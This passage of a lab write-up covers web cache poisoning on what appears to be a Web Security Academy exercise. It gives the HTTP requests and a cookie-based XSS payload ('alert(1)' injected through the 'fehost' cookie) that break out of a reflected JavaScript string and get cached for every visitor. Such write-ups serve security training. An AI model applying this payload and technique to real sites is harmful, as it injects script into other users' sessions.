# 7. Relevant HTTP Requests

## Reflection Verification

```http
GET /?cb=1234 HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: fehost=AAAA
```

The response reflected:

```javascript
"frontend":"AAAA"
```

---

## Cache Poisoning Request

```http
GET / HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: fehost=someString"-alert(1)-"someString
```

---

# 8. Proof of Concept (PoC)

Injected cookie:

```http
fehost=someString"-alert(1)-"someString
```

Resulting JavaScript:

```javascript
data = {
    "frontend":"someString"-alert(1)-"someString"
}
```

The injected payload successfully terminated the original string, executed `alert(1)`, and preserved valid JavaScript syntax.

Once cached, every subsequent visitor received the poisoned response.

